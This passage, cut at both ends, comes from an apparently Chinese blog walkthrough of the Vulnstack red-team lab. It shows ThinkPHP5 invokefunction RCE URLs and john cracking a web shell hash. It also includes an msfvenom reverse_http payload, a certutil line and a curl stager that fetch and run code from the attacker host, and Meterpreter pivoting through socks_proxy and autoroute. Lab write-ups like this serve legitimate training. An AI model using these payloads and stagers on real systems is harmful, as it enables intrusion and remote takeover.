\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没扫描什么漏洞\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e 并检测指纹，搭建的是\u003ccode\u003eThinkphp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面\u003ccode\u003enmap\u003c/code\u003e扫描出存在\u003ccode\u003erobots\u003c/code\u003e文件以及一些有趣的文件夹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没找到可以利用的，先爆破目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  dirsearch -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -e php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e: DeprecationWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e pkg_resources \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, \u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e, txt | HTTP method: GET | Threads: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e | Wordlist size: \u003cspan class=\"hljs-number\"\u003e10439\u003c/span\u003e\n\nOutput File: /root/reports/http_192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/_25-02-\u003cspan class=\"hljs-number\"\u003e19_07\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e13.\u003c/span\u003etxt\n\nTarget: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/\n\n[07:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] Starting: \n[07:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -  236B  - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n[07:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -  205B  - /a%5c.aspx\n[07:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /add.php\n[07:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /favicon.ico\n[07:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   24B  - /robots.txt\n[07:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  238B  - /static  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/static/\n[07:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  240B  - /static..  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/static../\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫出来一个\u003ccode\u003eadd.php\u003c/code\u003e ,访问，看着像是一个马？尝试爆破无果\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image61.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eThinkPHP5 RCE\u003c/h2\u003e\n\u003cp\u003e访问主页时可以看到是\u003ccode\u003eThinkPHP5\u003c/code\u003e ，那么我们尝试一下它的已知漏洞\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eMSF\u003c/code\u003e的\u003ccode\u003eThinkPHP5 RCE\u003c/code\u003e的\u003ccode\u003eEXP\u003c/code\u003e无法成功获得\u003ccode\u003eshell\u003c/code\u003e ，但是可以知道是存在\u003ccode\u003eRCE\u003c/code\u003e漏洞的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(unix/webapp/thinkphp_rce) \u003e run\n\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \n[*] Running automatic check (\u003cspan class=\"hljs-string\"\u003e\"set AutoCheck false\"\u003c/span\u003e to disable)\n[+] The target appears to be vulnerable. ThinkPHP \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.22\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e a vulnerable version.\n[*] Targeting ThinkPHP \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.22\u003c/span\u003e automatically\n[*] Using URL: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8081\u003c/span\u003e/OcBqkRdcc\n[+] Successfully executed command: curl -so /tmp/OQKmjuhK http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8081\u003c/span\u003e/OcBqkRdcc;chmod +x /tmp/OQKmjuhK;/tmp/OQKmjuhK;rm -f /tmp/OQKmjuhK\n[*] Command Stager progress - \u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e% done (\u003cspan class=\"hljs-number\"\u003e117\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e117\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e)\n[*] Server stopped.\n[*] Exploit completed, but no session was created.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿搜索的\u003ccode\u003ePOC\u003c/code\u003e进行利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/?s=index/\\think\\app/invokefunction\u0026#x26;function=phpinfo\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]=\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以成功回显\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image62.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e执行\u003ccode\u003ewhoami\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/?s=index/think\\app/invokefunction\u0026#x26;function=call_user_func_array\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]=system\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][]=whoami\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image63.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试读取\u003ccode\u003eadd.php\u003c/code\u003e 是否能看到密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/?s=index/think\\app/invokefunction\u0026#x26;function=call_user_func_array\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]=system\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][]=\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image64.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e/?s=index/think\\app/invokefunction\u0026#x26;function=call_user_func_array\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]=system\u0026#x26;\u003cspan class=\"hljs-built_in\"\u003evars\u003c/span\u003e[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e][]=\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e add.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image65.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读到密码的\u003ccode\u003eMD5\u003c/code\u003e值\u003ccode\u003e2aefc34200a294a3cc7db81b43a81873\u003c/code\u003e，将其放到\u003ccode\u003ejohn\u003c/code\u003e进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/ATTCK5  john --wordlist=/usr/share/wordlists/rockyou.txt --\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=Raw-MD5 \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e encoding: UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nLoaded \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (Raw-MD5 [MD5 \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e AVX2 8x3])\nWarning: no OpenMP support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e this \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e, consider --fork=\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Ctrl-C to abort, almost \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nadmins           (?)     \n1g \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e DONE (\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 08:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e) \u003cspan class=\"hljs-number\"\u003e33.33\u003c/span\u003eg/s 4467Kp/s 4467Kc/s 4467KC/s applecute..PHOEBE\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show --format=Raw-MD5\"\u003c/span\u003e options to display \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003eadmins\u003c/code\u003e ，访问\u003ccode\u003eadd.php\u003c/code\u003e 输入密码，成功进入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image66.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e获得立足点\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003emsfvenom\u003c/code\u003e生成\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/ATTCK5  msfvenom -p cmd/windows/http/x64/meterpreter/reverse_http lport=\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: cmd \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e125\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\ncertutil -urlcache -f http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/9Bk3xvWa9yQk92crn4JtvA %TEMP%\\AVQtnvStA.exe \u0026#x26; start /B %TEMP%\\AVQtnvStA.exe\n ⚡ root@kali  ~/Desktop/test/ATTCK5  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后\u003ccode\u003eMSF\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e use exploit/multi/handler                                                                                                                                           \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload cmd/windows/http/x64/meterpreter/reverse_http                                                                                                                                             \npayload =\u003e cmd/windows/http/x64/meterpreter/reverse_http   \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e                                                                                                                                                                                        \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e                                                                                                                                                                             \nmsf6 exploit(multi/handler) \u003e run  \n[*] Started HTTP reverse handler on http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e                   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后在\u003ccode\u003eweb\u003c/code\u003e端大马的命令执行中执行生成的\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image67.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功弹回\u003ccode\u003eshell\u003c/code\u003e ，获得立足点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[*] Started HTTP reverse handler on http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e                                                                                                                                                                     \n[!] http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e handling request \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e; (UUID: xyuftsit) Without a database connected that payload UUID tracking will \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e work!                                                                      \n[*] http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e handling request \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e; (UUID: xyuftsit) Staging x64 payload (\u003cspan class=\"hljs-number\"\u003e204892\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) ...                                                                                                      \n[!] http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e handling request \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e; (UUID: xyuftsit) Without a database connected that payload UUID tracking will \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e work!                                                                      \n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.133\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49411\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 08:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e -0500                                                                                                                       \n                                                                                                                  \nmeterpreter \u003e                                                                                                      \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003eip\u003c/code\u003e信息，得知内网网段是\u003ccode\u003e192.168.138.0\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ipconfig\nInterface \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e                  \n============                \nName         : Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\nHardware MAC : \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:c1:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e    \nMTU          : \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e\nIPv4 Address : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\nIPv4 Netmask : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\nIPv6 Address : fe80::c060:f526:12b5:625b\nIPv6 Netmask : ffff:ffff:ffff:ffff::   \n\nInterface \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e            \n============      \nName         : Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\nHardware MAC : \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:c1:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                         \nMTU          : \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e                                      \nIPv4 Address : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.136\u003c/span\u003e\nIPv4 Netmask : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\nIPv6 Address : fe80::\u003cspan class=\"hljs-number\"\u003e31e6\u003c/span\u003e:d7f6:258a:61d4              \nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e搭建隧道\u003c/h2\u003e\n\u003cp\u003e需要搭建隧道通到\u003ccode\u003ekali\u003c/code\u003e方便进行信息收集\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eMSF\u003c/code\u003e的\u003ccode\u003esocks_proxy\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e bg\n[*] Backgrounding session \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003e..\nmsf6 exploit(multi/handler) \u003e use auxiliary/server/socks_proxy \nmsf6 auxiliary(server/socks_proxy) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e version \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nmsf6 auxiliary(server/socks_proxy) \u003e run\n[*] Auxiliary module running \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e background job \u003cspan class=\"hljs-number\"\u003e0.\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e添加路由\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/multi/manage/autoroute \n\n[*] Running module against WIN7\n[*] Searching \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e subnets to autoroute.\n[+] Route added to subnet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e host\u003cspan class=\"hljs-string\"\u003e's routing table.\n[+] Route added to subnet 192.168.183.0/255.255.255.0 from host'\u003c/span\u003es routing table.\n[+] Route added to subnet \u003cspan class=\"hljs-number\"\u003e169.254\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e Bluetooth vc6.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e设置\u003ccode\u003eproxychain\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evim /etc/proxychains4.conf\n\nsocks5  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试是否成功，搭建成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/ATTCK5  proxychains4 curl \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.136\u003c/span\u003e\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan 